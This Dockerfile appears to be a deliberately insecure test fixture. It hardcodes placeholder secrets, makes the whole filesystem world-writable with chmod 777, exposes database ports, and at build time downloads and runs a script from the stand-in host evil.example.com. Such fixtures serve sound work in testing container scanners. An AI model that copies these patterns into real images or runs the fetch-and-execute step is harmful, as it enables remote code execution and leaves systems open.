FROM python:2.7

ENV APP_SECRET=FAKE_SECRET_FOR_TESTING_ONLY_12345
ENV DATABASE_PASSWORD=NOT_A_REAL_PASSWORD_REPLACE_ME

RUN apt-get update && apt-get install -y sudo
RUN sudo chmod -R 777 /

EXPOSE 3306
EXPOSE 5432

ADD http://evil.example.com/malicious.sh /tmp/malicious.sh
RUN sh /tmp/malicious.sh

CMD ["/bin/bash"]
